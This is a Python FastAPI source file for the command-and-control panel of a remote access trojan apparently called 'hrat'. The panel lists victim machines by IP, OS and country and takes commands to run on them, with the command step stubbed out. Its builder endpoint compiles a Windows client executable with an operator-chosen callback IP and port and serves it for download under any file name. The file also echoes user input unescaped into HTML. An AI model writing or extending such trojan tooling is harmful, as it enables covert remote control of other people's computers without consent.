import os
import subprocess
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.templating import Jinja2Templates
import asyncio

app = FastAPI()

templates = Jinja2Templates(directory="templates")

connected_clients = {
    "192.168.1.101": {"os": "Windows 11", "status": "Online", "country": "RU"},
    "10.0.2.15": {"os": "Windows 10", "status": "Online", "country": "US"},
    "192.168.1.102": {"os": "Windows 10", "status": "Offline", "country": "DE"},
}

@app.get("/", response_class=HTMLResponse)
async def get_main_page(request: Request):
    context = {
        "request": request,
        "clients": connected_clients,
    }
    return templates.TemplateResponse("index.html", context)


@app.post("/run_command/{client_ip}", response_class=HTMLResponse)
async def run_command(request: Request, client_ip: str):
    form_data = await request.form()
    command = form_data.get("command", "Empty command")

    print(f"Received command '{command}' for client: {client_ip}")


    await asyncio.sleep(1)
    response_from_client = f"Response to '{command}': ... OK"

    return HTMLResponse(f"""
        <div class='mt-3 p-3 bg-gray-700 border border-green-500 rounded-lg animate-pulse'>
            <p><strong>Response from {client_ip}:</strong></p>
            <pre class='text-green-300'>{response_from_client}</pre>
        </div>
    """)

@app.get("/controls/{client_ip}", response_class=HTMLResponse)
async def get_client_controls(request: Request, client_ip: str):
    client_info = connected_clients.get(client_ip)
    if not client_info:
        return HTMLResponse("<div class='text-red-500'>Client not found</div>")

    context = {"request": request, "ip": client_ip}
    return templates.TemplateResponse("controls.html", context)





@app.get("/builder", response_class=HTMLResponse)
async def get_builder_page(request: Request):
    return templates.TemplateResponse("builder.html", {"request": request})


@app.post("/build_client")
async def build_client(
    request: Request,
    host_ip: str = Form(...),
    port: str = Form("4040"),
    client_name: str = Form("hrat_client.exe")
):
    """
    Starts building the client with the specified parameters.
    Returns HTML with build logs and a download link.
    """
    # Path to your Rust client project.
    # WARNING: Ensure this path is correct for your system!
    client_project_path = "/home/hagz0r/Projects/rust/hrat/client"


    build_env = os.environ.copy()

    build_env["RAT_HOST_IP"] = host_ip
    build_env["RAT_HOST_PORT"] = port


    # We use `cargo build --release` to get an optimized build
    build_command = [
        "cargo", "build", "--release",
    ]

    print(f"Building with {build_env["RAT_HOST_IP"]}:{build_env["RAT_HOST_PORT"]}")
    print(f"Running build in : {client_project_path}")
    print(f"Command: {' '.join(build_command)}")

    # Start the build process in the background
    # `cwd` specifies the directory where the command should be executed
    process = await asyncio.create_subprocess_exec(
        *build_command,
        cwd=client_project_path,
        env=build_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    stdout, stderr = await process.communicate()

    if process.returncode == 0:
        built_file_path = os.path.join(client_project_path, "target", "release", "client.exe") # Ensure the name `client.exe` is correct

        download_url = f"/download/{client_name}"

        build_log = stdout.decode() + stderr.decode()
        response_html = f"""
            <div class="bg-green-800 border border-green-500 p-4 rounded-lg">
                <h3 class="font-bold text-lg">Build completed successfully!</h3>
                <a href="{download_url}" class="text-blue-300 hover:underline">Download {client_name}</a>
            </div>
        """
    else:
        build_log = stderr.decode() + stdout.decode()
        response_html = f"""
            <div class="bg-red-800 border border-red-500 p-4 rounded-lg">
                <h3 class="font-bold text-lg">Error occurred while building</h3>
            </div>
            <pre class="bg-gray-900 p-4 rounded-lg mt-4 text-xs whitespace-pre-wrap">{build_log}</pre>
        """

    return HTMLResponse(response_html)
@app.get("/download/{filename}")
async def download_file(filename: str):
    original_file_path = "/home/hagz0r/Projects/rust/hrat/client/target/release/client.exe"

    if os.path.exists(original_file_path):
        return FileResponse(path=original_file_path, media_type='application/octet-stream', filename=filename)

    return HTMLResponse("File not found", status_code=404)
